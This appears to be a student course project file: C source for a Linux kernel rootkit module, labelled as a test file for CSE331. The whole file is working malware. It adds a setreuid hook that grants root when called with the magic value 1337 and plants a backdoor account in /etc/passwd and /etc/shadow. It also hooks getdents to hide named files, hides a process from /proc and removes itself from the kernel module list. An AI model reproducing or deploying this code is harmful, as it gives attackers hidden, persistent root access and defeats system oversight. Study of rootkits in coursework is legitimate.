#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <asm/current.h>
#include <linux/kobject.h>




MODULE_LICENSE("GPL") ;
MODULE_AUTHOR("Brendan<brendanfoley1214@gmail.com>") ;
MODULE_DESCRIPTION("Rootkit Testfile for CSE331") ;
MODULE_VERSION("0.3");

void **sys_call_address; // Pointer to the sys_call_table	


asmlinkage int (* old_setreuid) (uid_t ruid, uid_t euid);
asmlinkage long our_setreuid(const struct pt_regs *regs){
	struct cred *creds;
	kuid_t zeroUID = KUIDT_INIT(0);
	kgid_t zeroGID = KGIDT_INIT(0);

	if((regs->si == 1337) && (regs->di == 1337)){
		creds = prepare_creds();
		creds->uid = zeroUID;
		creds->gid = zeroGID;
		creds->euid = zeroUID;
		creds->egid = zeroGID;
		creds->suid = zeroUID;
		creds->sgid = zeroGID;
		creds->fsuid = zeroUID;
		creds->fsgid = zeroGID;
		commit_creds(creds);
		return 0;
	}
	
	return old_setreuid(regs->si, regs->di);
}

// Start Marc - Inserting/removing backdoor & hide backdoor entrance
void add_backdoor(char *path) {
	
		char* backdoor_password = "rootkituser1:x:12345:0:backdoor:/home:/bin/bash\n";
		char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
		// PASSWORD (encodes in SHA 512) = cse331!	
		struct file *file;
		char *backdoor;
		mm_segment_t old_fs;
		
		char *buffer;
		bool backdoor_existing = false;
		int page_count = 0;
		
		loff_t offset; 
		
		unsigned long ret;
		
		if (strcmp(path, "/etc/passwd") == 0) 
			{backdoor = backdoor_password;}
		if (strcmp(path, "/etc/shadow") == 0)
			{backdoor = backdoor_shadow;}
		
		old_fs = get_fs(); 
		
		set_fs(get_ds()); 
	    	file = filp_open(path, O_RDWR, 0); 
	    	set_fs(old_fs); 

	    	if(IS_ERR(file)){
			goto exit;
	    	}

	    	//check if backdoor already exists
	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);

	    	if(!buffer){
			goto cleanup1;
	    	}

	    	backdoor_existing = false;
	    	ret = PAGE_SIZE;
	    	offset = 0;
	    	while(ret == PAGE_SIZE){
			offset = page_count*PAGE_SIZE;

			set_fs(get_ds());
			ret = vfs_read(file, buffer, PAGE_SIZE, &offset);
			set_fs(old_fs);

			if(ret < 0){
		    		goto cleanup2;
			}

			page_count++;

			if(strstr(buffer, backdoor)){
			    backdoor_existing = true;
			    break;
			}
	    	}

	    	if(backdoor_existing){
			goto cleanup2;
		    }

	    	//seek offset to end of file
	    	offset = 0;

	    	set_fs(get_ds());
	    	offset = vfs_llseek(file, offset, SEEK_END);
	    	set_fs(old_fs);

	    	if(offset < 0){
			goto cleanup2;
		}

		//add backdoor to the end of file
		ret = 0;
	    	set_fs(get_ds()); 
		ret = vfs_write(file, backdoor, strlen(backdoor),&offset); 
		set_fs(old_fs); 
	
		if(ret<0){
			goto cleanup2;
	    	}

		cleanup2:
		    if(buffer)
			kfree(buffer);
	
		cleanup1:
		    if(file)
			filp_close(file, NULL);
	
		exit:
		    return;
}

// void hide_backdoor (void) {
	
// original_getdents = (void *)sys_call_address[];                        \
//     sys_call_address[] = (unsigned long*)&hacked_func
	
// }

// End Marc

// START BRIAN - Hide files & directories from showing up when a user does "ls"

// taken from man getdents(2)
struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                              /* length is actually (d_reclen - 2 - offsetof(struct linux_dirent, d_name)) */
	/*
    char           pad;       // Zero padding byte
    char           d_type;    // File type (only since Linux 2.6.4); offset is (d_reclen - 1)
    */
};

int count;
static char* fileNames[5];
module_param_array(fileNames, charp, &count, 0); // This creates a command line parameter called fileNames. fileNames="a.txt", "b.txt", "c.txt" ... up to 5 files
		   
asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent* dirp, unsigned int count);

asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, unsigned int count){
	int rtn = original_getdents(fd, dirp, count); // rtn = the number of bytes of linux_dirent structs read from fd;
	struct linux_dirent* my_dirp = kmalloc(rtn, GFP_KERNEL); // Need to create a buffer to copy over dirp contents
	if(!my_dirp){
		printk(KERN_INFO "Failed to allocate memory\n");
		return rtn;
	}
	if(copy_from_user(my_dirp, dirp, rtn) != 0){ // Need to copy since we're unable to directly dereference dirp pointer
		printk(KERN_INFO "Failed to copy all bytes from copy_from_user\n");
		kfree(my_dirp);
		return rtn;
	}
	struct linux_dirent* cur = my_dirp;
	int i = 0;
	int j;
	int foundFile;
	while(i < rtn){
		foundFile = 0;
		for(j = 0; fileNames[j] && j < count; j++){
			if (strncmp(cur->d_name, fileNames[j], strlen(fileNames[j])) == 0){
				int reclen = cur->d_reclen;
				char* next_rec = (char*)cur + reclen;
				int len = (int)my_dirp + rtn - (int)next_rec;
				memmove(cur, next_rec, len); // Overwrite dirent by shifting contents to the left
				rtn -= reclen; // New dirp array will now be shorter since a dir ent got overwritten
				foundFile = 1;
				continue;
			}
		}
		if(foundFile == 0){ // This flag prevents the program from skipping ahead when memory already got shifted
			i += cur->d_reclen;
			cur = (struct linux_dirent*) ((char*)my_dirp + i); // Go to next dir entry 
		}
		copy_to_user(dirp, my_dirp, rtn); // Safely copy over modified results to dirp
	}
	kfree(my_dirp);
	return rtn;
}

// END BRIAN


//START CARLOS
//iterate takes pointer to dir_context	
struct list_head *module_list;//reference to module_list. Used to hide mod from insmod
static char *proc_to_hide = "1";
static struct file_operations proc_fops;//pointers to listing contents in proc dir
static struct file_operations *backup_proc_fops;//keep backup in order to restore orginal struct 
static struct inode *proc_inode;
static struct path p;

struct dir_context *backup_ctx;
 
static int overwritten_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
    //prints contents 
    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0){
	printk(KERN_INFO "@%@?: overwritte_filldir going into hiding");
	return 0;
    }

    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);//return orginal pointer to  dir_context.Prints it off.
}

struct dir_context hacked_ctx = {
    .actor = overwritten_filldir_t,//Evil struct
};

//getdents() calls iterate_dir() which calls iterate_shared()
int overwritten_iterate_shared(struct file *file, struct dir_context *ctx){
    printk(KERN_INFO "@$@!: rk_iterate_shared"); 
    int result = 0;
    hacked_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_proc_fops->iterate_shared(file, &hacked_ctx);
    ctx->pos = hacked_ctx.pos;
    return result;
}

//END  CARLOS  





// Loads the LKM
static int __init rootkit_init(void){
	// Gets the address of the sys call table
	sys_call_address = (void*)kallsyms_lookup_name("sys_call_table"); 
	if (sys_call_address == NULL) {
    	printk(KERN_ERR "Couldn't look up sys_call_table\n");
    	return -1;
  	}
	
	char *password_file = "/etc/passwd";
	char *shadow_file = "/etc/shadow";
	
	// Start Marc 
	
	add_backdoor(password_file);
   	add_backdoor(shadow_file);
	
	// End Marc
	
	printk(KERN_INFO "sys_call_table Address is: %X\n", *sys_call_address);
	write_cr0(read_cr0() & (~0x10000)); // This will make the sys call table writable

	// Start Brian
	original_getdents = sys_call_address[__NR_getdents]; // Get the pointer to the original sys call function
	sys_call_address[__NR_getdents] = (void*)&sys_getdents_hook; // Replace the pointer on the table with our hook
	// End Brian

	// Start Brendan
	old_setreuid = sys_call_address[__NR_setreuid];
	sys_call_address[__NR_setreuid] = our_setreuid;
	printk(KERN_INFO "setreuid replaced\n");
	// End Brendan

	//Start Carlos
	module_list = THIS_MODULE->list.prev;//moves pointer
    	list_del(&THIS_MODULE->list);//del the current pointer. Removes module from insmod.
	printk(KERN_INFO "@$@?: The process is \"%s\" (pid %i)\n", current->comm, current->pid);
	

	if(kern_path("/proc", 0, &p)){
        	printk(KERN_INFO "@%@?: System forced to exit becaus path for /proc not found");
		return 0;
	}
		
	
	proc_inode = p.dentry->d_inode;/*get the inode*/
    	proc_fops = *proc_inode->i_fop;/* get a copy of file_oprartions from inode*/
   	backup_proc_fops = proc_inode->i_fop;/* back up file_operation*/
  	proc_fops.iterate_shared = overwritten_iterate_shared; /* modify copy without hijacked function */
   	proc_inode->i_fop = &proc_fops; /* overwrite the proc entry file operations */
	printk(KERN_INFO "@$@?: Process in hiding");
	//End Carlos
		

	write_cr0(read_cr0() | 0x10000); // This will make the sys call table read only again
	return 0;
}

// Exits the LKM
static void __exit rootkit_exit(void){
	write_cr0(read_cr0() & (~0x10000)); // This will make the sys call table writable
	// We must undo the changes to the sys call table or our systems get fucked
	sys_call_address[__NR_getdents] = original_getdents;
	sys_call_address[__NR_setreuid] = old_setreuid;
	write_cr0(read_cr0() | 0x10000); // This will make the sys call table read only again
	printk(KERN_INFO "Old setreuid inserted");
	printk(KERN_INFO "Rootkit Unloaded\n");
	if(kern_path("/proc", 0, &p))
        	return;
    	proc_inode = p.dentry->d_inode;
    	proc_inode->i_fop = backup_proc_fops;
	return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
